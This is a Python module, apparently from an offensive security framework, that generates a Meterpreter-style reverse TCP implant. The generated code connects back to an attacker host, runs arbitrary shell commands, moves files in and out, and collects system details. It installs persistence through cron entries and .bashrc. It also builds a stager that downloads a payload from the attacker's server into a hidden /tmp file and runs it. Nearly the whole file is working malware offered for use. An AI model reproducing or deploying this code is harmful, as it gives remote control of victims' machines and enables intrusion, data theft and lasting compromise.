#!/usr/bin/env python3
"""
Meterpreter-style Reverse TCP Payload
======================================

Advanced payload that creates a reverse TCP connection with enhanced features
including encryption, persistence, and advanced post-exploitation capabilities.

Author: Brainless Security Team
Module: payloads/meterpreter_reverse_tcp
Type: payload
Rank: excellent
"""

import os
import sys
import socket
import threading
import subprocess
import base64
import json
import time
import platform
import getpass
import pwd
import grp
from pathlib import Path

# Add framework path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.logger import LoggerMixin

NAME = "Meterpreter-style Reverse TCP Payload"
DESCRIPTION = "Advanced reverse TCP payload with encryption and persistence"
AUTHOR = "Brainless Security Team"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "payload"

class MeterpreterPayload(LoggerMixin):
    """
    Advanced meterpreter-style payload with encryption and persistence
    """
    
    def __init__(self):
        super().__init__('MeterpreterPayload')
        self.lhost = None
        self.lport = 4444
        self.encryption_key = None
        self.persistence = True
        self.beacon_interval = 60
        self.timeout = 30
        self.socket = None
        self.running = False
        
    def set_option(self, option: str, value: str):
        """Set payload options"""
        if option.lower() == 'lhost':
            self.lhost = value
        elif option.lower() == 'lport':
            self.lport = int(value)
        elif option.lower() == 'encryption_key':
            self.encryption_key = value
        elif option.lower() == 'persistence':
            self.persistence = value.lower() == 'true'
        elif option.lower() == 'beacon_interval':
            self.beacon_interval = int(value)
        elif option.lower() == 'timeout':
            self.timeout = int(value)
    
    def get_options(self) -> dict:
        """Get payload options"""
        return {
            'LHOST': {'description': 'Local host to connect back to', 'required': True, 'default': ''},
            'LPORT': {'description': 'Local port to connect back to', 'required': False, 'default': '4444'},
            'ENCRYPTION_KEY': {'description': 'Encryption key for communication', 'required': False, 'default': 'brainless123'},
            'PERSISTENCE': {'description': 'Enable persistence (true/false)', 'required': False, 'default': 'true'},
            'BEACON_INTERVAL': {'description': 'Beacon interval in seconds', 'required': False, 'default': '60'},
            'TIMEOUT': {'description': 'Connection timeout in seconds', 'required': False, 'default': '30'}
        }
    
    def generate_encrypted_payload(self) -> str:
        """
        Generate the encrypted payload code
        """
        payload_code = f'''
import socket
import subprocess
import threading
import platform
import getpass
import os
import sys
import base64
import json
import time

LHOST = "{self.lhost}"
LPORT = {self.lport}
ENCRYPTION_KEY = "{self.encryption_key}"
BEACON_INTERVAL = {self.beacon_interval}
TIMEOUT = {self.timeout}

def encrypt_data(data):
    """Simple XOR encryption"""
    if not ENCRYPTION_KEY:
        return data
    key = ENCRYPTION_KEY.encode()
    encrypted = b""
    for i, byte in enumerate(data.encode()):
        encrypted += bytes([byte ^ key[i % len(key)]])
    return base64.b64encode(encrypted).decode()

def decrypt_data(data):
    """Simple XOR decryption"""
    if not ENCRYPTION_KEY:
        return data
    try:
        data = base64.b64decode(data.encode())
        key = ENCRYPTION_KEY.encode()
        decrypted = b""
        for i, byte in enumerate(data):
            decrypted += bytes([byte ^ key[i % len(key)]])
        return decrypted.decode()
    except:
        return data

def execute_command(command):
    """Execute a system command"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        return {{
            'status': 'success',
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        }}
    except subprocess.TimeoutExpired:
        return {{
            'status': 'error',
            'message': 'Command timed out'
        }}
    except Exception as e:
        return {{
            'status': 'error',
            'message': str(e)
        }}

def get_system_info():
    """Get system information"""
    return {{
        'platform': platform.platform(),
        'system': platform.system(),
        'processor': platform.processor(),
        'architecture': platform.architecture(),
        'hostname': platform.node(),
        'username': getpass.getuser(),
        'uid': os.getuid() if hasattr(os, 'getuid') else None,
        'gid': os.getgid() if hasattr(os, 'getgid') else None,
        'cwd': os.getcwd(),
        'path': os.environ.get('PATH', ''),
        'home': os.environ.get('HOME', ''),
        'shell': os.environ.get('SHELL', ''),
        'python_version': sys.version
    }}

def upload_file(data):
    """Upload a file to the target"""
    try:
        filename = data.get('filename')
        content = base64.b64decode(data.get('content', ''))
        
        with open(filename, 'wb') as f:
            f.write(content)
        
        return {{
            'status': 'success',
            'message': f'File {{filename}} uploaded successfully'
        }}
    except Exception as e:
        return {{
            'status': 'error',
            'message': str(e)
        }}

def download_file(data):
    """Download a file from the target"""
    try:
        filename = data.get('filename')
        
        with open(filename, 'rb') as f:
            content = f.read()
        
        return {{
            'status': 'success',
            'filename': filename,
            'content': base64.b64encode(content).decode()
        }}
    except Exception as e:
        return {{
            'status': 'error',
            'message': str(e)
        }}

def create_persistence():
    """Create persistence mechanism"""
    try:
        # Create a cron job for persistence
        cron_entry = f"* * * * * python3 {{__file__}} > /dev/null 2>&1\\n"
        
        # Try different persistence methods
        persistence_methods = [
            lambda: open('/etc/cron.d/brainless', 'w').write(cron_entry),
            lambda: open(f'/var/spool/cron/root', 'a').write(cron_entry),
            lambda: open(f'/home/{{getpass.getuser()}}/.bashrc', 'a').write(f"python3 {{__file__}} &\\n")
        ]
        
        for method in persistence_methods:
            try:
                method()
                return True
            except:
                continue
        
        return False
    except:
        return False

def handle_client_connection(client_socket):
    """Handle incoming client commands"""
    try:
        while True:
            # Send beacon
            beacon_data = {{
                'type': 'beacon',
                'info': get_system_info()
            }}
            client_socket.send(encrypt_data(json.dumps(beacon_data)).encode() + b"\\n")
            
            # Wait for command
            data = client_socket.recv(4096).decode().strip()
            if not data:
                break
            
            # Decrypt and parse command
            try:
                command_data = json.loads(decrypt_data(data))
            except:
                continue
            
            cmd_type = command_data.get('type')
            
            if cmd_type == 'execute':
                result = execute_command(command_data.get('command', ''))
                response = json.dumps(result)
                
            elif cmd_type == 'upload':
                result = upload_file(command_data)
                response = json.dumps(result)
                
            elif cmd_type == 'download':
                result = download_file(command_data)
                response = json.dumps(result)
                
            elif cmd_type == 'info':
                result = get_system_info()
                response = json.dumps(result)
                
            elif cmd_type == 'exit':
                break
                
            else:
                response = json.dumps({{'status': 'error', 'message': 'Unknown command'}})
            
            # Send response
            client_socket.send(encrypt_data(response).encode() + b"\\n")
            time.sleep(BEACON_INTERVAL)
            
    except Exception as e:
        pass
    finally:
        try:
            client_socket.close()
        except:
            pass

def main():
    """Main payload execution"""
    try:
        # Create persistence if enabled
        if {str(self.persistence).lower()}:
            create_persistence()
        
        # Connect to handler
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((LHOST, LPORT))
        
        # Handle the connection
        handle_client_connection(s)
        
    except Exception as e:
        # If connection fails, try again after a delay
        time.sleep(BEACON_INTERVAL)
        main()

if __name__ == '__main__':
    main()
'''
        
        return payload_code
    
    def save_payload_to_file(self, payload_code: str, filename: str = None) -> str:
        """
        Save payload to a file
        """
        if not filename:
            filename = f"meterpreter_payload_{int(time.time())}.py"
        
        try:
            with open(filename, 'w') as f:
                f.write(payload_code)
            
            # Make executable
            os.chmod(filename, 0o755)
            
            self.info(f"Payload saved to: {filename}")
            return filename
            
        except Exception as e:
            self.error(f"Failed to save payload: {e}")
            return None
    
    def generate_shellcode(self) -> str:
        """
        Generate shellcode version of the payload
        """
        payload_code = self.generate_encrypted_payload()
        
        # Convert to shellcode format
        shellcode = ""
        for char in payload_code:
            shellcode += f"\\x{ord(char):02x}"
        
        return shellcode
    
    def create_stager(self) -> str:
        """
        Create a stager that downloads and executes the full payload
        """
        stager_code = f'''
import urllib.request
import subprocess
import os

PAYLOAD_URL = "http://{self.lhost}/payload.py"
PAYLOAD_FILE = "/tmp/.brainless_payload.py"

try:
    # Download payload
    urllib.request.urlretrieve(PAYLOAD_URL, PAYLOAD_FILE)
    os.chmod(PAYLOAD_FILE, 0o755)
    
    # Execute payload
    subprocess.Popen(["python3", PAYLOAD_FILE])
    
except:
    # Fallback to inline payload
    exec("""{self.generate_encrypted_payload().replace('"""', '\\"\\"\\"')}""")
'''
        
        return stager_code
    
    def run(self) -> dict:
        """
        Generate and save the payload
        """
        if not self.lhost:
            return {'success': False, 'message': 'LHOST not specified'}
        
        try:
            self.info(f"Generating meterpreter payload for {self.lhost}:{self.lport}")
            
            # Generate payload code
            payload_code = self.generate_encrypted_payload()
            
            # Save to file
            filename = self.save_payload_to_file(payload_code)
            
            if filename:
                # Generate additional artifacts
                shellcode = self.generate_shellcode()
                stager = self.create_stager()
                
                return {
                    'success': True,
                    'message': 'Payload generated successfully',
                    'filename': filename,
                    'lhost': self.lhost,
                    'lport': self.lport,
                    'shellcode': shellcode[:100] + "...",  # Truncate for display
                    'stager': stager,
                    'encryption_key': self.encryption_key,
                    'persistence': self.persistence,
                    'beacon_interval': self.beacon_interval
                }
            else:
                return {'success': False, 'message': 'Failed to generate payload'}
                
        except Exception as e:
            self.error(f"Payload generation failed: {e}")
            return {'success': False, 'message': f'Payload generation failed: {str(e)}'}


def run(options: dict = None) -> dict:
    """
    Entry point for the payload module
    """
    payload = MeterpreterPayload()
    
    # Set options if provided
    if options:
        for key, value in options.items():
            payload.set_option(key, value)
    
    return payload.run()


if __name__ == '__main__':
    # Example usage
    options = {
        'LHOST': '192.168.1.10',
        'LPORT': '4444',
        'ENCRYPTION_KEY': 'brainless123',
        'PERSISTENCE': 'true',
        'BEACON_INTERVAL': '60',
        'TIMEOUT': '30'
    }
    
    result = run(options)
    print(result)